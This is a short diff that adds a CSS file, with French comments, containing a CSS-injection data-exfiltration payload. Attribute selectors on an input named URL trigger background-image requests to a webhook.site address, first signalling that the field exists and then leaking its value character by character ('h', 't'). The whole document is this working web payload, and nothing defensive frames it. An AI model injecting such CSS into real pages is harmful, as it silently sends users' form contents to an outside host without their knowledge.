@@ -1,0 +1,8 @@
+/* Détection basique */
+input[name="URL"] {
+  background: url("https://webhook.site/027836fb-255a-48a0-9dd3-c80e889a57ab?field=url");
+}
+
+/* Détection caractère par caractère (optionnel) */
+input[name="URL"][value^="h"] { background: url("https://webhook.site/027836fb-255a-48a0-9dd3-c80e889a57ab?c=h"); }
+input[name="URL"][value^="t"] { background: url("https://webhook.site/027836fb-255a-48a0-9dd3-c80e889a57ab?c=t"); }
